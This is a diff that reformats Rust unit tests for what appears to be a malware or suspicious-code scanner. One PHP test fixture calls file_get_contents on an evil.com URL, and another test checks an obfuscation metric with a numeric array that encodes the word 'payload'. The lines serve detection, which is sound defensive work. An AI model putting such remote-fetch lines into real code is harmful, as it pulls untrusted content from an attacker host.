@@ -693,19 +693,31 @@ fn xor_mod_loop_is_detected() {
 fn php_call_string_arg_value_is_captured() {
     let src = br#"<?php $d = file_get_contents("http://evil.com/x");"#;
     let p = open_with_path(std::path::Path::new("f.php"), src).unwrap();
-    let arg = p.symbols().iter_kind(SymbolKind::Call).find_map(|s| match s {
-        Symbol::Call { target: Some(t), args, .. } if t == "file_get_contents" => Some(args.clone()),
-        _ => None,
-    }).expect("file_get_contents call");
-    assert!(matches!(arg.first(), Some(filefacts::Arg::String { value }) if value.contains("http://evil.com")),
-        "PHP string arg value should be captured: {arg:?}");
+    let arg = p
+        .symbols()
+        .iter_kind(SymbolKind::Call)
+        .find_map(|s| match s {
+            Symbol::Call {
+                target: Some(t),
+                args,
+                ..
+            } if t == "file_get_contents" => Some(args.clone()),
+            _ => None,
+        })
+        .expect("file_get_contents call");
+    assert!(
+        matches!(arg.first(), Some(filefacts::Arg::String { value }) if value.contains("http://evil.com")),
+        "PHP string arg value should be captured: {arg:?}"
+    );
 }
-
 
 #[test]
 fn numeric_array_max_length_metric() {
     let py = b"a = [112, 97, 121, 108, 111, 97, 100]\nb = ['x','y','z']\n";
     let p = open_with_path(std::path::Path::new("n.py"), py).unwrap();
-    assert_eq!(p.metrics().get("ast.numeric_array_max_length"), Some(7.0),
-        "the 7-int array counts; the string array does not");
+    assert_eq!(
+        p.metrics().get("ast.numeric_array_max_length"),
+        Some(7.0),
+        "the 7-int array counts; the string array does not"
+    );
 }
